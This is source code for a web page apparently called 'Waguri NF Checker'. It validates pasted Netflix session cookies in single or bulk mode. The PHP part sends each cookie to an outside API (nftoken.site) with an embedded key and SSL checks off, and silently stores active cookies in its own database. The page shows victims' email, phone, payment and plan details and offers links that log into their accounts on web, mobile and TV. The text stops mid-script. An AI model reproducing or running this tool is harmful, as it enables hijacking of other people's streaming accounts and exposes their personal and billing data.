<?php
require_once 'db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw_post_data = file_get_contents('php://input');
    $json_data = json_decode($raw_post_data, true);

    if (isset($json_data['cookie'])) {
        
        $my_api_key = "NFK_f6535c3f25765787380fd370"; 
        
        $api_url = "https://nftoken.site/v1/api.php";

        $payload = json_encode([
            'key' => $my_api_key,
            'cookie' => $json_data['cookie']
        ]);

        $ch = curl_init($api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);

        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        // --- NEW DATABASE SAVING LOGIC (COOKIES ONLY) ---
        if ($http_code == 200 && $response) {
            $resp_data = json_decode($response, true);
            
            // If the account is ACTIVE, save only the cookie to Heroku Postgres
            if (isset($resp_data['status']) && $resp_data['status'] === 'SUCCESS' && isset($pdo)) {
                try {
                    // Check if the cookie already exists in the database
                    $check_stmt = $pdo->prepare("SELECT id FROM active_accounts WHERE cookie_data = :cookie");
                    $check_stmt->execute([':cookie' => $json_data['cookie']]);
                    
                    if ($check_stmt->rowCount() == 0) {
                        // Only insert if it doesn't exist (prevents duplicates)
                        $stmt = $pdo->prepare("
                            INSERT INTO active_accounts (cookie_data) 
                            VALUES (:cookie)
                        ");
                        $stmt->execute([
                            ':cookie' => $json_data['cookie']
                        ]);
                    }
                } catch (\PDOException $e) {
                    error_log("Failed to save cookie: " . $e->getMessage());
                }
            }
        }
        // ------------------------------------------------

        http_response_code($http_code);
        header('Content-Type: application/json');
        echo $response;
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Waguri NF Checker | Premium</title>
    <link rel="icon" href="waguri1.png" type="image/png">   
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');

        /* Galactic Premium Theme - Rose/Crimson Edition (Main Site) */
        :root {
            --bg-color: #09090b; /* Zinc 950 */
            --card-bg: #121214; 
            --border-color: rgba(255, 255, 255, 0.08);
            --text-main: #f8fafc;
            --text-muted: #a1a1aa;
            --accent-gradient: linear-gradient(135deg, #f43f5e, #8b5cf6); /* Rose to Purple */
            --accent-glow: rgba(244, 63, 94, 0.4);
            
            /* Harmonized Result Card Specific Colors */
            --res-card-bg: rgba(255, 255, 255, 0.02);
            --res-border: rgba(255, 255, 255, 0.08);
            --res-accent: #f43f5e;
        }

        body { 
            background: var(--bg-color); 
            color: var(--text-main); 
            font-family: 'Inter', sans-serif; 
            padding-top: 120px; /* Increased padding to accommodate larger logo/navbar */
            background-image: radial-gradient(circle at 50% 0%, rgba(139, 92, 246, 0.1) 0%, transparent 50%);
            background-repeat: no-repeat;
            min-height: 100vh;
        }
        
        /* Top Navigation Bar */
        .navbar-custom {
            background: rgba(18, 18, 20, 0.7);
            border-bottom: 1px solid var(--border-color);
            backdrop-filter: blur(12px);
            padding: 16px 0;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            z-index: 999;
        }

        /* Glassmorphism Cards */
        .card-premium { 
            background: var(--card-bg); 
            border: 1px solid var(--border-color); 
            border-radius: 20px; 
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255,255,255,0.05); 
            backdrop-filter: blur(10px);
        }

        /* Typography */
        .title-gradient {
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 800;
            letter-spacing: -1px;
        }

        /* Inputs */
        textarea.form-control, input.form-control { 
            background: rgba(0, 0, 0, 0.4); 
            border: 1px solid var(--border-color); 
            color: var(--text-main); 
            border-radius: 12px; 
            padding: 15px;
            font-size: 14px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        textarea.form-control:focus, input.form-control:focus { 
            background: rgba(0, 0, 0, 0.6); 
            border-color: #8b5cf6; 
            box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.15); 
            outline: none; 
            color: var(--text-main); 
        }
        textarea.form-control::placeholder, input.form-control::placeholder {
            color: #52525b;
        }
        
        /* Premium Buttons */
        .btn-start { 
            background: var(--accent-gradient); 
            border: none; 
            color: white; 
            border-radius: 12px; 
            font-weight: 600; 
            text-transform: uppercase; 
            letter-spacing: 1px; 
            font-size: 14px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            z-index: 1;
        }
        .btn-start::before {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(135deg, #8b5cf6, #f43f5e);
            z-index: -1;
            transition: opacity 0.3s ease;
            opacity: 0;
        }
        .btn-start:hover::before { opacity: 1; }
        .btn-start:hover { 
            transform: translateY(-2px); 
            box-shadow: 0 8px 20px var(--accent-glow); 
            color: white;
        }

        /* Custom Pill Tabs Redesign */
        .mode-switcher {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            padding: 6px;
            display: inline-flex;
            margin-bottom: 30px;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.3);
        }
        .mode-btn {
            background: transparent;
            color: var(--text-muted);
            border: none;
            padding: 12px 35px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
            position: relative;
        }
        .mode-btn:hover:not(.active) {
            color: #fff;
            background: rgba(255,255,255,0.03);
        }
        .mode-btn.active {
            background: var(--accent-gradient);
            color: #fff;
            box-shadow: 0 4px 15px rgba(244, 63, 94, 0.3);
        }

        /* Stats Classes */
        .stat-num { font-size: 36px; font-weight: bold; }
        .stat-label { font-size: 11px; text-transform: uppercase; color: var(--text-muted); letter-spacing: 1.5px; font-weight: 700; }

        /* --- EXACT RESULT CARD UI --- */
        .premium-ui-card {
            border: 1px solid var(--res-border);
            border-radius: 16px;
            background: var(--res-card-bg);
            overflow: hidden;
            width: 100%;
        }
        .card-head {
            border-bottom: 1px solid var(--res-border);
            padding: 18px 24px;
            background: rgba(255,255,255,0.01);
        }
        .card-body-pad {
            padding: 24px 24px 30px 24px;
        }
        
        .field-label {
            font-size: 10px;
            color: var(--text-muted);
            font-weight: 700;
            letter-spacing: 1.5px;
            text-transform: uppercase;
            margin-bottom: 6px;
        }
        .field-value {
            font-size: 15px;
            color: var(--text-main);
            font-weight: 600;
        }
        .email-value {
            font-size: 22px;
            font-weight: 700;
            word-break: break-all;
            letter-spacing: 0.5px;
        }
        
        /* Action Pills (PC / TV) */
        .action-pill-group {
            display: flex;
            margin-top: 1.5rem;
            gap: 12px;
        }
        .action-pill {
            flex: 1 1 0;
            text-align: center;
            border: 1px solid var(--res-border);
            color: var(--text-main);
            padding: 12px 0;
            border-radius: 12px;
            font-size: 13px;
            font-weight: 600;
            letter-spacing: 0.5px;
            text-decoration: none;
            transition: 0.2s;
            background: rgba(255,255,255,0.01);
            cursor: pointer;
            display: inline-block;
        }
        .action-pill:hover {
            background: rgba(244, 63, 94, 0.1);
            color: #f43f5e;
            border-color: #f43f5e;
            text-decoration: none;
            box-shadow: 0 4px 12px rgba(244, 63, 94, 0.2);
        }

        /* Carousel Navigation & Cards */
        .carousel-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            position: relative;
            padding: 10px 0;
        }
        .carousel-viewport {
            flex-grow: 1;
            overflow: hidden;
            position: relative;
        }
        .carousel-card { display: none; width: 100%; animation: fadeScale 0.3s ease-in-out forwards; }
        .carousel-card.active { display: block; }
        @keyframes fadeScale { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }

        .nav-btn-icon {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--res-border);
            color: var(--text-muted);
            width: 44px;
            height: 44px;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            transition: 0.2s;
            cursor: pointer;
            font-size: 16px;
            flex-shrink: 0;
        }
        .nav-btn-icon:hover:not(:disabled) {
            color: #f43f5e;
            background: rgba(244, 63, 94, 0.15);
            border-color: #f43f5e;
            box-shadow: 0 4px 12px rgba(244, 63, 94, 0.3);
        }
        .nav-btn-icon:disabled { opacity: 0.3; cursor: not-allowed; }
        
        .carousel-indicator {
            text-align: center;
            color: var(--text-muted);
            font-size: 14px;
            font-weight: 600;
            margin-top: 20px;
            letter-spacing: 0.5px;
        }

        /* Status Badges for non-active cards (Single Mode) */
        .status-badge { font-size: 10px; padding: 6px 12px; border-radius: 8px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; }
        .status-error { background: rgba(239, 68, 68, 0.1); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.2); }
        .status-warning { background: rgba(245, 158, 11, 0.1); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.2); }

        .fade-in { animation: fadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }

        /* Loader */
        .loader {
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid #f43f5e;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Modal Styles */
        .modal-backdrop {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
            z-index: 1050;
            display: flex; align-items: center; justify-content: center;
        }
        .modal-content {
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 24px;
            width: 90%; max-width: 420px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }

        /* -------------------------------------------
           MOBILE RESPONSIVE QUERIES 
           ------------------------------------------- */
        @media (max-width: 768px) {
            body { padding-top: 115px; } /* Increased to prevent overlap with navbar */
            .navbar-custom h1 { font-size: 1.2rem !important; }
            
            .card-premium { padding: 20px !important; }
            .title-gradient { font-size: 2.2rem !important; }

            /* Adjust Text Area height on mobile */
            #bulkInput { height: 200px; }

            /* Stats shrink slightly */
            .stat-num { font-size: 28px; }
            .stat-label { font-size: 9px; letter-spacing: 1px; }

            /* Result Card internal paddings and fonts */
            .card-body-pad { padding: 20px 16px 24px 16px; }
            .email-value { font-size: 18px; }
            .field-value { font-size: 13px; }
            .field-label { font-size: 9px; }
            
            /* Action Pills spacing */
            .action-pill { font-size: 11px; padding: 10px 0; }
            .action-pill-group { gap: 8px; }
            
            /* Carousel Nav Buttons shrink */
            .carousel-wrapper { gap: 10px; }
            .nav-btn-icon { width: 36px; height: 36px; font-size: 14px; }
        }

        @media (max-width: 480px) {
            /* Mode Switcher expands full width on tiny screens */
            .mode-switcher { display: flex; width: 100%; }
            .mode-btn { flex: 1; padding: 10px 0; font-size: 13px; }
            
            /* Stats stack or wrap if too tight */
            #bulkStats { flex-wrap: wrap; gap: 15px; }
            #bulkStats > div { flex: 1 1 30%; }

            /* Action pills stack vertically on very small screens for massive touch targets */
            .action-pill-group { flex-direction: column; gap: 10px; }
            .action-pill { width: 100%; }
        }
    </style>
</head>
<body>

<!-- Top Navigation Bar -->
<nav class="navbar-custom">
    <div class="container d-flex justify-content-between align-items-center">
        <div class="d-flex align-items-center">
            <!-- Custom Logo Image (replace "your-logo.png" with your actual file path/URL) -->
            <img src="waguri1.png" alt="Waguri Logo" class="mr-3" style="width: 56px; height: 56px; object-fit: contain; border-radius: 12px;">
            <h1 class="title-gradient m-0" style="font-size: 1.5rem; letter-spacing: 0;">Waguri NF Checker</h1>
        </div>
        <div class="text-muted d-none d-sm-block" style="font-size: 0.9rem; font-weight: 500; letter-spacing: 0.5px;">
            Secure & Premium Token Auth
        </div>
    </div>
</nav>

<!-- Format Modal -->
<div id="formatModal" class="modal-backdrop" style="display: none;">
    <div class="modal-content fade-in">
        <div class="d-flex justify-content-between align-items-center mb-3">
            <h5 class="text-white font-weight-bold m-0"><i class="fas fa-exclamation-circle text-[#f43f5e] mr-2"></i> Requirement Notice</h5>
            <button onclick="closeModal()" class="text-muted bg-transparent border-0" style="cursor: pointer; font-size: 1.2rem;"><i class="fas fa-times"></i></button>
        </div>
        <p style="color: var(--text-muted); font-size: 14px; line-height: 1.6;">
            Requires <strong class="text-white">SecureNetflixId</strong> and <strong class="text-white">NetflixId</strong>. To guarantee accurate cookie validation, please confirm that your session data contains both fields.
        </p>
        <button onclick="closeModal()" class="btn btn-start w-100 mt-3 py-2">Understood</button>
    </div>
</div>

<!-- Mobile Guide Modal -->
<div id="mobileGuideModal" class="modal-backdrop" style="display: none;">
    <div class="modal-content fade-in" style="max-width: 500px;">
        <div class="d-flex justify-content-between align-items-center mb-4">
            <h5 class="text-white font-weight-bold m-0"><i class="fas fa-mobile-alt text-[#f43f5e] mr-2"></i> Watch on Mobile Guide</h5>
            <button onclick="closeMobileGuide()" class="text-muted bg-transparent border-0" style="cursor: pointer; font-size: 1.2rem;"><i class="fas fa-times"></i></button>
        </div>
        
        <div style="color: var(--text-muted); font-size: 13px; line-height: 1.6; max-height: 60vh; overflow-y: auto; padding-right: 5px;">
            <p class="text-white mb-3 font-weight-bold" style="font-size: 14px;">To Watch on Mobile App is 50/50 but there still a chance! This method works for some devices, just try and try!</p>
            
            <ol class="pl-3 mb-4" style="list-style-type: decimal;">
                <li class="mb-2">Open Netflix App (Make sure it's <strong>Clear Data</strong>). Leave it open.</li>
                <li class="mb-2">Make sure you're using our website in <strong>Chrome</strong> (Better chances based on some users).</li>
                <li class="mb-2">Now click the "<strong>WATCH ON MOBILE</strong>" button below.</li>
                <li class="mb-2">If an 'Open App' prompt shows in the browser, click it and it will direct to the Netflix app.</li>
            </ol>
            
            <div class="p-3 mb-3" style="background: rgba(244, 63, 94, 0.05); border-left: 3px solid #f43f5e; border-radius: 0 8px 8px 0;">
                <p class="text-[#f43f5e] font-weight-bold mb-1" style="font-size: 14px;">If this didn't work:</p>
                <p class="mb-0 text-gray-300">Click the <strong>Web Button</strong> first. It will direct to a new tab. Now go back to the Checker again and click the Watch on Mobile again. Some say this works. Just try and try. This is depending on Device and Browsers.</p>
            </div>
        </div>

        <a id="actualMobileLink" href="#" target="_blank" class="btn btn-start w-100 mt-2 py-3 text-center" style="display: block; text-decoration: none;">
            <i class="fas fa-external-link-alt mr-2"></i> WATCH ON MOBILE
        </a>
    </div>
</div>

<!-- TV Guide Modal -->
<div id="tvGuideModal" class="modal-backdrop" style="display: none;">
    <div class="modal-content fade-in" style="max-width: 500px;">
        <div class="d-flex justify-content-between align-items-center mb-3">
            <h5 class="text-white font-weight-bold m-0"><i class="fas fa-tv text-[#f43f5e] mr-2"></i> Watch on TV Guide</h5>
            <button onclick="closeTvGuide()" class="text-muted bg-transparent border-0" style="cursor: pointer; font-size: 1.2rem;"><i class="fas fa-times"></i></button>
        </div>
        
        <div style="color: var(--text-muted); font-size: 13px; line-height: 1.6; max-height: 60vh; overflow-y: auto; padding-right: 5px;">
            
            <div class="mb-4 d-flex align-items-center gap-2">
                <input type="text" id="tvLinkInput" class="form-control" readonly style="flex: 1; margin-bottom: 0; padding: 12px; font-size: 12px; background: rgba(0,0,0,0.5);">
                <button onclick="copyTvLink()" class="btn btn-start py-2 px-3" style="margin-bottom: 0; min-width: 80px;"><i class="fas fa-copy"></i> Copy</button>
            </div>

            <p class="text-white mb-4 font-weight-bold" style="font-size: 14px;">To watch Netflix on your TV is high chance especially if you have a PC or a Laptop.</p>
            
            <div class="mb-4">
                <p class="text-[#f43f5e] font-weight-bold mb-1" style="font-size: 14px;">Option 1 (PC/Laptop)</p>
                <p class="mb-0 text-gray-300">If you have a PC/Laptop, kindly click the <strong>Web</strong> button first. After it directly logs you in, copy the highlighted link from this modal or press Copy, paste it into your browser's address bar, and enter the code shown on your TV.</p>
            </div>

            <div class="mb-2">
                <p class="text-[#f43f5e] font-weight-bold mb-1" style="font-size: 14px;">Option 2 (Mobile)</p>
                <p class="mb-0 text-gray-300">If you only have mobile, kindly click the <strong>Mobile Guide</strong> button. After it directly logs you into the Netflix application, simply scan the QR code displayed on your Netflix TV screen using your device.</p>
            </div>
        </div>
    </div>
</div>

<div class="container pb-5">
    <div class="row justify-content-center">
        <div class="col-md-10 col-lg-9">

            <!-- Input Container -->
            <div class="card-premium p-4 p-md-5 mb-4 relative z-10" id="inputContainer">
                
                <div class="text-center">
                    <div class="mode-switcher">
                        <button class="mode-btn active" id="btnTabSingle" onclick="switchTab('single')">Single Check</button>
                        <button class="mode-btn" id="btnTabBulk" onclick="switchTab('bulk')">Bulk Check</button>
                    </div>
                </div>

                <!-- SINGLE CHECK SECTION -->
                <div id="sectSingle" class="fade-in">
                    <label class="font-weight-bold mb-2 text-white" style="font-size: 14px;">Input Single Token/Cookie</label>
                    <textarea id="singleInput" class="form-control mb-4" rows="4" style="resize: none; overflow-y: auto;" placeholder="Paste single Netscape block, JSON, or NetflixId here..."></textarea>
                    <button id="startSingleBtn" class="btn btn-start w-100 py-3" onclick="processSingle()">
                        <i class="fas fa-bolt mr-2"></i> CHECK ACCOUNT
                    </button>
                </div>

                <!-- BULK CHECK SECTION -->
                <div id="sectBulk" style="display: none;">
                    <div class="d-flex justify-content-between align-items-end mb-2">
                        <label class="font-weight-bold text-white mb-0" style="font-size: 14px;">Paste Bulk Cookies</label>
                        <span style="font-size: 12px; color: #f43f5e; cursor: pointer; transition: 0.2s;" onclick="openModal()"><i class="fas fa-info-circle"></i> Supported Formats</span>
                    </div>
                    <p class="mb-3" style="font-size: 12px; color: var(--text-muted);">
                        Paste one cookie per line or use universal separator ( | ). Netscape and JSON blocks are automatically parsed.
                    </p>
                    <textarea id="bulkInput" class="form-control mb-4" rows="12" style="resize: none; overflow-y: auto;" placeholder="Format: NetflixId=... | SecureNetflixId=...&#10;Or paste full JSON/Netscape formats..."></textarea>
                    <button id="startBulkBtn" class="btn btn-start w-100 py-3" onclick="processBulk()">
                        <i class="fas fa-layer-group mr-2"></i> START BULK CHECK
                    </button>
                </div>
            </div>

            <!-- RESULTS SECTION -->
            <div class="card-premium p-4 p-md-5" id="resultsCard" style="display: none;">
                
                <!-- NEW: Identifiable Header wrapper -->
                <div id="resultsHeader" class="d-flex justify-content-between align-items-center mb-4 pb-3" style="border-bottom: 1px solid var(--border-color);">
                    <h5 class="font-weight-bold text-white m-0"><i class="fas fa-satellite-dish mr-2 text-[#f43f5e]"></i> Live Results</h5>
                    <span id="progressText" style="color: var(--text-muted); font-size: 13px; font-weight: 500;">Awaiting...</span>
                </div>
                
                <!-- Bulk Stats Dashboard -->
                <div id="bulkStats" class="d-flex justify-content-around mb-5 pb-4" style="border-bottom: 1px solid var(--border-color); display: none;">
                    <div class="text-center">
                        <div class="stat-num" style="color: #34d399;" id="statActive">0</div>
                        <div class="stat-label">Active</div>
                    </div>
                    <div class="text-center">
                        <div class="stat-num" style="color: #f87171;" id="statDead">0</div>
                        <div class="stat-label">Invalid / Dead</div>
                    </div>
                    <div class="text-center">
                        <div class="stat-num" style="color: #fbbf24;" id="statLimit">0</div>
                        <div class="stat-label">Rate Limited</div>
                    </div>
                </div>

                <!-- Single Mode Normal List -->
                <div id="singleResultsList"></div>

                <!-- Bulk Mode Navigational Carousel -->
                <div id="carouselWrapper" class="carousel-wrapper" style="display: none;">
                    <button id="btnPrev" class="nav-btn-icon" onclick="navCarousel(-1)"><i class="fas fa-chevron-left"></i></button>
                    
                    <div class="carousel-viewport">
                        <div id="bulkResultsList"></div>
                    </div>
                    
                    <button id="btnNext" class="nav-btn-icon" onclick="navCarousel(1)"><i class="fas fa-chevron-right"></i></button>
                </div>
                
                <!-- Interactive Carousel Indicator -->
                <div id="carouselIndicator" class="carousel-indicator" style="display: none;">0 of 0 Active Accounts</div>

            </div>

        </div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    // --- Modal Logic ---
    function openModal() { $('#formatModal').css('display', 'flex'); }
    function closeModal() { $('#formatModal').hide(); }
    
    // --- Mobile Guide Modal Logic ---
    function openMobileGuide(link) { 
        $('#actualMobileLink').attr('href', link);
        $('#mobileGuideModal').css('display', 'flex'); 
    }
    function closeMobileGuide() { 
        $('#mobileGuideModal').hide(); 
    }

    // --- TV Guide Modal Logic ---
    function openTvGuide(link) { 
        $('#tvLinkInput').val(link);
        $('#tvGuideModal').css('display', 'flex'); 
    }
    function closeTvGuide() { 
        $('#tvGuideModal').hide(); 
    }
    function copyTvLink() {
        const link = $('#tvLinkInput').val();
        navigator.clipboard.writeText(link).then(() => {
            alert("TV Link copied to clipboard!");
        }).catch(err => {
            alert("Failed to copy TV link: " + err);
        });
    }

    // --- Carousel State Logic ---
    let currentActiveIndex = 0;
    let totalActiveCards = 0;

    function navCarousel(direction) {
        const cards = $('#bulkResultsList .carousel-card');
        if (cards.length === 0) return;

        $(cards[currentActiveIndex]).removeClass('active');
        
        currentActiveIndex += direction;
        
        if (currentActiveIndex < 0) currentActiveIndex = 0;
        if (currentActiveIndex >= totalActiveCards) currentActiveIndex = totalActiveCards - 1;
        
        $(cards[currentActiveIndex]).addClass('active');
        updateCarouselUI();
    }

    function updateCarouselUI() {
        if (totalActiveCards === 0) {
            $('#carouselWrapper, #carouselIndicator').hide();
            return;
        }
        $('#carouselWrapper, #carouselIndicator').show();
        $('#carouselIndicator').html(`<span class="text-white">${currentActiveIndex + 1}</span> of <span class="text-white">${totalActiveCards}</span> Active Accounts`);
        
        $('#btnPrev').prop('disabled', currentActiveIndex === 0);
        $('#btnNext').prop('disabled', currentActiveIndex >= totalActiveCards - 1);
    }

    // --- UI Mode Logic ---
    function switchTab(mode) {
        // Hide active results whenever a tab is switched
        $('#resultsCard').hide();
        $('#singleResultsList').empty();
        $('#bulkResultsList').empty();
        $('#bulkStats').removeClass('d-flex').hide();
        $('#resultsHeader').removeClass('d-flex').hide();
        $('#carouselWrapper, #carouselIndicator').hide();

        if (mode === 'single') {
            $('#btnTabSingle').addClass('active');
            $('#btnTabBulk').removeClass('active');
            $('#sectSingle').show().addClass('fade-in');
            $('#sectBulk').hide().removeClass('fade-in');
        } else {
            $('#btnTabBulk').addClass('active');
            $('#btnTabSingle').removeClass('active');
            $('#sectBulk').show().addClass('fade-in');
            $('#sectSingle').hide().removeClass('fade-in');
        }
    }

    // --- Core Parsing Logic ---
    function parseMixedInput(text) {
        let extracted = [];
        let startIndex = 0;
        
        while ((startIndex = text.indexOf('[', startIndex)) !== -1) {
            let endIndex = startIndex;
            let foundValid = false;
            while ((endIndex = text.indexOf(']', endIndex + 1)) !== -1) {
                let potentialJson = text.substring(startIndex, endIndex + 1);
                try {
                    let parsed = JSON.parse(potentialJson);
                    if (Array.isArray(parsed)) {
                        extracted.push(potentialJson.trim());
                        text = text.substring(0, startIndex) + " ".repeat(potentialJson.length) + text.substring(endIndex + 1);
                        foundValid = true;
                        break;
                    }
                } catch (e) {}
            }
            if (!foundValid) startIndex++; 
        }
        
        text = text.replace(/\|/g, '\n');
        let lines = text.split(/\r?\n/);
        let currentNetscape = [];
        let seenKeys = new Set(); 
        
        lines.forEach(line => {
            let trimmed = line.trim();
            if (!trimmed || trimmed === ';') {
                if (currentNetscape.length > 0) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
                return;
            }
            if (trimmed.endsWith(';')) trimmed = trimmed.slice(0, -1).trim();
            if (trimmed.includes('.netflix.com') && (trimmed.includes('TRUE') || trimmed.includes('FALSE'))) {
                let parts = trimmed.split(/\s+/);
                if (parts.length >= 6) {
                    let keyName = parts[5];
                    if (seenKeys.has(keyName)) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
                    seenKeys.add(keyName);
                }
                currentNetscape.push(trimmed);
            } else if (trimmed.includes('NetflixId=') || trimmed.includes('SecureNetflixId=')) {
                if (currentNetscape.length > 0) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
                extracted.push(trimmed);
            }
        });
        if (currentNetscape.length > 0) extracted.push(currentNetscape.join('\n'));
        return extracted;
    }

    const sleep = ms => new Promise(r => setTimeout(r, ms));
    const apiUrl = window.location.href;

    // --- Rendering HTML Logic ---
    function createResultElement(data, httpStatus, mode, indexNum) {
        if (data.status === 'SUCCESS') {
            let planStr = data.x_tier || 'Unknown';
            let locStr = data.x_loc || 'Unknown';
            let premiumColor = planStr.includes('Premium') ? '#f43f5e' : '#c084fc'; 
            
            let directLink = data.x_l1 || '#';
            let mobileLink = data.x_l2 || '#';
            let tvLink = data.x_l3 || '#';

            // Hide the "ACCOUNT #X" badge if it's just a single check
            let accountBadge = mode === 'bulk' ? `<div style="background: rgba(255,255,255,0.05); padding: 4px 12px; border-radius: 6px; font-weight: 700; font-size: 11px; letter-spacing: 1px; color: var(--text-muted);">ACCOUNT #${indexNum}</div>` : `<div></div>`;

            return `
            <div class="premium-ui-card mx-auto">
                <div class="card-head d-flex justify-content-between align-items-center">
                    ${accountBadge}
                    <div style="color: var(--res-accent); font-weight: 700; font-size: 12px; letter-spacing: 1px;">
                        <i class="fas fa-circle mr-1" style="font-size: 8px; vertical-align: middle;"></i> ACTIVE
                    </div>
                </div>
                <div class="card-body-pad">
                    <div class="mb-4 pb-2 border-bottom" style="border-color: rgba(255,255,255,0.05) !important;">
                        <div class="field-label">EMAIL IDENTITY</div>
                        <div class="field-value email-value">${data.x_mail || 'Valid Account'}</div>
                    </div>
                    
                    <div class="row mb-4">
                        <div class="col-6">
                            <div class="field-label">PLAN</div>
                            <div class="field-value" style="color: ${premiumColor};">${planStr}</div>
                        </div>
                        <div class="col-6 text-right">
                            <div class="field-label">COUNTRY</div>
                            <div class="field-value">${locStr}</div>
                        </div>
                    </div>

                    <div class="row mb-4">
                        <div class="col-6">
                            <div class="field-label">PHONE</div>
                            <div class="field-value">${data.x_tel || 'N/A'}</div>
                        </div>
                        <div class="col-6 text-right">
                            <div class="field-label">PAYMENT</div>
                            <div class="field-value">${data.x_bil || 'N/A'}</div>
                        </div>
                    </div>

                    <div class="row mb-4">
                        <div class="col-6">
                            <div class="field-label">MEMBER SINCE</div>
                            <div class="field-value">${data.x_mem || 'N/A'}</div>
                        </div>
                        <div class="col-6 text-right">
                            <div class="field-label">RENEWAL DATE</div>
                            <div class="field-value">${data.x_ren || 'N/A'}</div>
                        </div>
                    </div>

                    <div class="mb-4">
                        <div class="field-label">PROFILES</div>
                        <div class="field-value" style="font-size: 14px; line-height: 1.5;">${data.x_usr || 'N/A'}</div>
                    </div>

                    <div class="action-pill-group">
                        <a href="${directLink}" target="_blank" class="action-pill"><i class="fas fa-desktop mr-2"></i> Web</a>
                        <button onclick="openMobileGuide('${mobileLink}')" class="action-pill"><i class="fas fa-mobile-alt mr-2"></i> Mobile Guide</button>
                        <button onclick="openTvGuide('${tvLink}')" class="action-pill"><i class="fas fa-tv mr-2"></i> TV Guide</button>
                    </div>
                </div>
            </div>`;
        } 
        
        // If in Bulk Mode, we do not draw error/invalid blocks (handled via stats dashboard)
        if (mode === 'bulk') return '';

        // Single check error blocks
        if (data.status === 'ERROR' && httpStatus === 429) {
            return `
            <div class="result-item d-flex align-items-center fade-in" style="border: 1px solid var(--border-color); background: rgba(255,255,255,0.02); padding: 20px; border-radius: 12px; margin-bottom: 10px;">
                <span class="status-badge status-warning mr-3"><i class="fas fa-exclamation-triangle mr-1"></i> RATE LIMIT</span>
                <span style="color: var(--text-muted); font-size: 13px;">${data.message}</span>
            </div>`;
        } else {
            return `
            <div class="result-item d-flex align-items-center fade-in" style="border: 1px solid var(--border-color); background: rgba(255,255,255,0.02); padding: 20px; border-radius: 12px; margin-bottom: 10px;">
                <span class="status-badge status-error mr-3"><i class="fas fa-times mr-1"></i> INVALID</span>
                <span style="color: var(--text-muted); font-size: 13px;">Cookie Expired or Invalid</span>
            </div>`;
        }
    }

    // --- Single Check Execution ---
    async function processSingle() {
        const rawText = $('#singleInput').val().trim();
        if (!rawText) return alert("Please enter a cookie string first.");

        const cookies = parseMixedInput(rawText);
        const cookieToTest = cookies.length > 0 ? cookies[0] : rawText;

        const btn = $('#startSingleBtn');
        const originalHtml = btn.html();
        
        btn.prop('disabled', true).html('<div class="loader"></div> CHECKING...');
        
        // Show Card but FORCE HIDE headers and stats by stripping d-flex
        $('#resultsCard').show();
        $('#resultsHeader').removeClass('d-flex').hide(); 
        $('#bulkStats').removeClass('d-flex').hide();
        
        $('#singleResultsList').show();
        $('#carouselWrapper, #carouselIndicator').hide();
        
        // Add centered Loading Animation while processing
        $('#singleResultsList').html(`
            <div class="text-center py-5 fade-in">
                <div class="loader" style="width: 40px; height: 40px; border-width: 4px; border-top-color: #f43f5e;"></div>
                <div class="mt-3" style="color: var(--text-muted); font-size: 14px; font-weight: 600; letter-spacing: 1px; text-transform: uppercase;">Authenticating...</div>
            </div>
        `);
        
        try {
            const response = await fetch(apiUrl, {
                method: 'POST',
